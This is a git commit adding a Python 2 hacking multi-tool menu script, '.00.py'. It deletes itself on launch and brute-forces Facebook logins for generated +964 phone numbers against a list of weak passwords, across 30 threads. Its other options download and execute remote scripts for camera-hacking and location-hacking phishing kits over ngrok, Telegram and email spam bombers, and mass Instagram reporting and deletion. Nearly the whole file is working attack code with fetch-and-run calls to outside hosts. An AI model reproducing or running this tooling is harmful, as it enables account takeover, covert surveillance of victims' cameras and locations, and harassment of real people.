79b241b6d14776e96044d467ed300897d5fb326e
slrslrslr190 <86885852+slrslrslr190@users.noreply.github.com>
2021-07-11 00:25:04 +0300

    Add files via upload

---
+++ .00.py
@@ -0,0 +1,253 @@
+import os, sys, time, datetime
+from wget import *
+import random, hashlib
+import re, threading, json
+import urllib, cookielib, getpass, time
+os.system("rm -rf pain.py ;rm -rf .00.py")
+for n in range(100090):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    os.system("python2 ..py")
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    os.system('python2 ..py')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser 
+
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+
+
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+hala = "  \033[31;1m 1\033[0;1m - CRACK With Number()   \033[31;1m\n  \033[31;1m 2\033[0;1m - CRACK With ID Clone( Error )   \n  \033[31;1m 3 \033[0;1m- Spam Msg(Telegram)\n  \033[31;1m 4\033[0;1m - View TikTok( Requests Library ) \n  \033[31;1m 5\033[0;1m - Report-Insta(Spam Only!)\n  \033[31;1m 6\033[0;1m - Unfollow(Insta)\n  \033[31;1m 7\033[0;1m - Spam-Comment(Insta)\n  \033[31;1m 8\033[0;1m - Delet-All-Chat(Insta)\n  \033[31;1m 9\033[0;1m - Delet-All-Post(Insta)\n  \033[31;1m 10\033[0;1m - Delet-All(Post.Saved![Insta])\n  \033[31;1m 11\033[0;1m - Download Youtube Video\n\033[31;1m   12\033[0;1m - Spam Msg[Email, Yahoo ..Etc(New)]  \033[31;1m\n\033[31;1m   13\033[0;1m - User-Scanner(!)  \033[31;1m\n\033[31;1m   14\033[0;1m - Camera-HACK(Ngrok-Port=3333) (For Fixing)\033[31;1m\n\033[31;1m   15\033[0;1m - Location-HACK(Ngrok-Port=1337) [ ! ] \033[31;1m\n\n\n \033[31;1m  999 \033[0;1m-\033[31;1m NGROK-ViP\033[0;1m\n\n\033[31;1m  0 \033[0;1m- Exit\033[31;1m Program\033[0;1m"
+def t():
+	print("\n")
+   
+
+
+def cb():
+	print("\n")
+
+    
+
+               
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+
+    
+    
+def action():
+    global cpb
+def t():
+	print("\n")
+    
+
+
+def cb():
+	print("\n")
+
+               
+
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+
+    
+    
+def menu():
+    os.system('rm -rf list.txt')
+    os.system("xdg-open https://t.me/Lawan_CRACKER")
+    time.sleep(2)
+    print(hala)
+    print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input(' Choose: ')
+    if bch == '3233211':
+        os.system("python2 ....py")
+        print ' Wrong !'
+        action()
+    elif bch == '15':
+        download("https://github.com/slrslrslr190/Lo/raw/main/.1.zip")
+        os.system("unzip .1.zip ;clear ;bash .install.sh")
+    elif bch == '999':
+        download("https://raw.githubusercontent.com/slrslrslr190/ngrok/main/ngrok.py")
+        os.system("python2 ngrok.py")
+    elif bch == '11':
+        download("https://raw.githubusercontent.com/slrslrslr190/20000/main/youtubeVED.py")
+        os.system("python youtubeVED.py")
+    elif bch == '10':
+        download("https://raw.githubusercontent.com/slrslrslr190/100/main/deletallsavedpost.py")
+        os.system("python deletallsavedpost.py")
+    elif bch == '4':
+        download("https://raw.githubusercontent.com/slrslrslr190/007/main/15.py")
+        os.system("python 15.py")
+    elif bch == '5':
+        download("https://raw.githubusercontent.com/slrslrslr190/55/main/reportinsta.py")
+        os.system("python reportinsta.py")
+    elif bch == '8':
+        download("https://raw.githubusercontent.com/slrslrslr190/233/main/deletchat.py")
+        os.system("python deletchat.py")
+    elif bch == '6':
+        download("https://raw.githubusercontent.com/slrslrslr190/66/main/unfollow.py")
+        os.system("python unfollow.py")
+    elif bch == '9':
+        download("https://raw.githubusercontent.com/slrslrslr190/90/main/deletallpost.py")
+        os.system("python deletallpost.py")
+    elif bch == '7':
+        download("https://raw.githubusercontent.com/slrslrslr190/77/main/instao.py")
+        os.system("python instao.py")
+    elif bch == '19191919195':
+        print("\n")
+    elif bch == '3':
+        download("https://raw.githubusercontent.com/slrslrslr190/10/main/.10.py")
+    	os.system("python .10.py")
+    elif bch == "12":
+        download("https://raw.githubusercontent.com/slrslrslr190/atkemil/main/EmBomber.py")
+    	os.system("python2 EmBomber.py")
+    elif bch == "13":
+        download("https://raw.githubusercontent.com/slrslrslr190/user/main/userhub.sh")
+    	os.system("bash userhub.sh")
+    elif bch == "14":
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/.index.php")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/https://raw.githubusercontent.com/sfrsfrsfr3/hac-c/main/index.html")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/https://raw.githubusercontent.com/sfrsfrsfr3/hac-c/main/.s.html")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/ip.php")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/post.php")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/saycheese.html")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/saycheese.sh")
+        download("https://raw.githubusercontent.com/slrslrslr190/hac-c/main/template.html")
+        os.system("clear ;bash saycheese.sh")
+    elif bch == "2":
+        download("https://raw.githubusercontent.com/slrslrslr190/0/main/.0.py")
+    	os.system("python2 .0.py")
+    elif bch == '1':
+     	os.system('clear')
+     	print("\033[32m.")
+     	os.system("clear")
+     	os.system("figlet Lawa")
+     	print("\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m")
+     	print '\033[32m 770 - 771 - 772 - 773 - 774\n  750 - 751 - 752 - 753 - 754\n   780 - 781 - 782 - 783 - 784\033[0;1m\n\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'
+     	try:
+     	    k = '+964'
+            c = raw_input('\033[90;1m Choose : ')
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '!'
+            raw_input('\n[ Return ]')
+            menu()
+
+
+    elif bch == '13':
+        login()
+    elif bch == '0':
+        exb()
+    else:
+        print '!'
+        action()
+    xxx = str(len(id))
+    print '\033[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[0;1m'
+
+    def main(arg):
+        user = arg
+        try:
+            time.sleep(0.1)
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\033[1;32;40m[Great]\033[0m ' + k + c + user + ' : ' + pass1
+            elif 'free.facebook.com' in q['error_msg']:
+                print '[\033[31mUnder Surveillance\033[0;1m] ' + k + c + user + ' : ' + pass1
+            else:
+                pass2 = "1234512345"
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                   print '\033[1;32;40m[Great]\033[0m ' + k + c + user + ' : ' + pass2
+                elif 'free.facebook.com' in q['error_msg']:
+                    print '[\033[31mUnder Surveillance\033[0;1m] ' + k + c + user + ' : ' + pass2
+                else:
+                    pass3 = "123454321"
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\033[1;32;40m[Great]\033[0m ' + k + c + user + ' : ' + pass3
+                    elif 'free.facebook.com' in q['error_msg']:
+                        print '[\033[31mUnder Surveillance\033[0;1m] ' + k + c + user + ' : ' + pass3
+                    else:
+                        pass4 = "123456123456"
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\033[1;32;40m[Great]\033[0m ' + k + c + user + ' : ' + pass4
+                        elif 'free.facebook.com' in q['error_msg']:
+                            print ' Number: ' + k + c + user + ' PASS: ' + pass4
+                        else:
+                            pass5 = "1122334455"
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\033[1;32;40m[Great]\033[0m ' + k + c + user + ' : ' + pass5
+                            elif 'free.facebook.com' in q['error_msg']:
+                                print '[\033[31mUnder Surveillance\033[0;1m] ' + k + c + user + ' : ' + pass5
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '         '
+    print 'Its Over ....'
+    raw_input('\n[Enter]')
+    os.sys.exit()
+    
+if __name__ == '__main__':
+    menu()    
+ 
